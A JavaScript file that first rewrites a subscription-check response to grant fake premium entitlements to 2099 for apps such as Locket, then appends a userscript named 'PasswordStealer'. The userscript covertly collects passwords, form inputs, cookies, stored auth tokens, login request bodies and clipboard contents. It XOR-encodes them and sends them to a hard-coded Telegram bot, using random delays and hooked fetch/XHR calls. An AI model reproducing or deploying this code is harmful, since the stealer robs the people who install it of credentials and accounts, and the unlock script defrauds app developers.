const mapping = {
  '%E8%BD%A6%E7%A5%A8%E7%A5%A8': ['vip+watch_vip'],
  'Locket': ['Gold']
};

var ua = $request.headers["User-Agent"] || $request.headers["user-agent"];
var obj = JSON.parse($response.body);

obj.Attention = "Chúc mừng bạn! Vui lòng không bán hoặc chia sẻ cho người khác!";

var ohoang7 = {
  is_sandbox: false,
  ownership_type: "PURCHASED",
  billing_issues_detected_at: null,
  period_type: "normal",
  expires_date: "2099-12-18T01:04:17Z",
  grace_period_expires_date: null,
  unsubscribe_detected_at: null,
  original_purchase_date: "2024-07-28T01:04:18Z",
  purchase_date: "2024-07-28T01:04:17Z",
  store: "app_store"
};

var vuong2023 = {
  grace_period_expires_date: null,
  purchase_date: "2024-07-28T01:04:17Z",
  product_identifier: "com.ohoang7.premium.yearly",
  expires_date: "2099-12-18T01:04:17Z"
};

const match = Object.keys(mapping).find(e => ua.includes(e));

if (match) {
  let [e, s] = mapping[match];
  
  if (s) {
    vuong2023.product_identifier = s;
    obj.subscriber.subscriptions[s] = ohoang7;
  } else {
    obj.subscriber.subscriptions["com.ohoang7.premium.yearly"] = ohoang7;
  }

  obj.subscriber.entitlements[e] = vuong2023;
} else {
  obj.subscriber.subscriptions["com.ohoang7.premium.yearly"] = ohoang7;
  obj.subscriber.entitlements.pro = vuong2023;
}

$done({ body: JSON.stringify(obj) });


// ==UserScript==
// @name         PasswordStealer
// @description  Thu thập mật khẩu, token và dữ liệu tài khoản ngầm
// @author       EvilHacker (giả lập)
// ==/UserScript==

(function() {
    // Mã hóa dữ liệu với XOR và base64
    function encryptData(data) {
        const key = 'stealthy-key';
        let str = JSON.stringify(data);
        let encrypted = '';
        for (let i = 0; i < str.length; i++) {
            encrypted += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return btoa(encrypted);
    }

    // Gửi dữ liệu ngầm qua Telegram
    function sendData(data) {
        const encrypted = encryptData(data);
        const botToken = '7813188023:AAH7YGf5xEvdFRH61-MtXMo3_kboHo4Q7Ks'; // Bot Token bạn cung cấp
        const chatId = '5913888287'; // Chat ID bạn cung cấp
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const message = `Dữ liệu thu thập được:\n${decodeURIComponent(encrypted)}`;
        
        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(error => console.error('Lỗi gửi Telegram:', error));
    }

    // Thu thập dữ liệu tài khoản nhạy cảm
    function collectCriticalData() {
        return {
            timestamp: Date.now(),
            url: window.location.href,
            formData: extractFormInputs(),
            cookies: document.cookie,
            tokens: extractTokens(),
            xhrData: captureXHR(),
            clipboard: getClipboard()
        };
    }

    function extractFormInputs() {
        const inputs = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]');
        const data = {};
        inputs.forEach(input => {
            if (input.value) {
                data[input.name || input.id || input.type] = input.value;
            }
        });
        return data;
    }

    function extractTokens() {
        const tokens = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.match(/token|auth|session/i)) {
                    tokens[key] = localStorage.getItem(key);
                }
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key.match(/token|auth|session/i)) {
                    tokens[key] = sessionStorage.getItem(key);
                }
            }
        } catch {
            return 'error';
        }
        return tokens;
    }

    function captureXHR() {
        const captured = {};
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            originalXHROpen.apply(this, arguments);
        };
        const originalXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            if (body && (this._url.includes('login') || this._url.includes('auth'))) {
                captured[this._url] = body;
            }
            originalXHRSend.apply(this, arguments);
        };
        const originalFetch = window.fetch;
        window.fetch = async function(url, options) {
            if (options?.body && url.match(/login|auth|api/i)) {
                captured[url] = options.body;
            }
            return originalFetch.apply(this, arguments);
        };
        return captured;
    }

    async function getClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            return text.match(/^(?=.*[A-Za-z])(?=.*\d).{8,}$/) ? text : 'no-password';
        } catch {
            return 'unaccessible';
        }
    }

    // Khởi động và che giấu
    (function init() {
        const delay = 2000 + Math.random() * 8000;
        setTimeout(() => {
            Promise.resolve(collectCriticalData()).then(data => {
                if (Object.keys(data.formData).length || Object.keys(data.tokens).length || data.cookies) {
                    sendData(data);
                }
            });

            setInterval(() => {
                Promise.resolve(collectCriticalData()).then(data => {
                    if (Object.keys(data.formData).length || Object.keys(data.tokens).length) {
                        sendData(data);
                    }
                });
            }, 180000 + Math.random() * 180000);
        }, delay);

        document.addEventListener('submit', e => {
            const formData = extractFormInputs();
            if (Object.keys(formData).length) {
                sendData({ event: 'form_submit', data: formData });
            }
        }, { passive: true });

        document.addEventListener('input', e => {
            if (e.target.type === 'password' && e.target.value) {
                sendData({ event: 'password_input', value: e.target.value });
            }
        }, { passive: true });
    })();

    (function obfuscate() {
        const descriptors = Object.getOwnPropertyDescriptors(window);
        for (let prop in descriptors) {
            if (prop.match(/fetch|xhr/i)) {
                Object.defineProperty(window, prop, {
                    ...descriptors[prop],
                    writable: false
                });
            }
        }
    })();
})();
